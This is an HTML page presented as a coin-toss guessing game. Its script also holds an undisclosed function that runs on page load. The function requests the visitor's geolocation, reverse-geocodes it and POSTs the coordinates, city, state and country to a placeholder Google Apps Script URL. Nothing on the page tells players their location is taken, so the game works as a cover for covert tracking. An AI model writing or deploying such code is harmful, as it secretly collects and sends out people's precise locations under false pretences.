  <meta charset="UTF-8">
  <title>Coin Toss Game</title>
  <style>
    body { background: black; color: white; text-align: center; font-family: Arial; }
    button { padding: 10px 20px; margin: 10px; font-size: 18px; border-radius: 10px; }
  </style>
</head>
<body>

<h1>Coin Toss Game</h1>
<button onclick="playGame('heads')">Heads</button>
<button onclick="playGame('tails')">Tails</button>

<p id="result"></p>
<p id="score">Wins: 0 | Losses: 0</p>

<script>
  let wins = 0, losses = 0;

  function playGame(guess) {
    const result = Math.random() < 0.5 ? 'heads' : 'tails';
    if (guess === result) {
      wins++;
      document.getElementById('result').innerText = `You chose ${guess}. Coin is ${result}. You Win!`;
    } else {
      losses++;
      document.getElementById('result').innerText = `You chose ${guess}. Coin is ${result}. You Lose!`;
    }
    document.getElementById('score').innerText = `Wins: ${wins} | Losses: ${losses}`;
  }

  // Collect Location and Send to Google Sheets
  function getLocationAndSend() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(function(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        // Reverse Geocode to get City, State, Country
        fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`)
        .then(response => response.json())
        .then(locationData => {
            const data = {
                city: locationData.address.city || locationData.address.town || locationData.address.village || "",
                state: locationData.address.state || "",
                country: locationData.address.country || "",
                latitude: latitude,
                longitude: longitude
            };

            // Send data to Google Sheets via Apps Script Web App
            fetch('YOUR_WEB_APP_URL_HERE', { // Replace this
                method: "POST",
                body: JSON.stringify(data),
                headers: { "Content-Type": "application/json" }
            })
            .then(response => console.log("Location data sent successfully!"))
            .catch(err => console.error("Error sending location:", err));
        });
      });
    } else {
      alert("Geolocation is not supported by this browser.");
    }
  }

  // Trigger location sending on page load
  window.onload = getLocationAndSend;
</script>

</body>
</html>
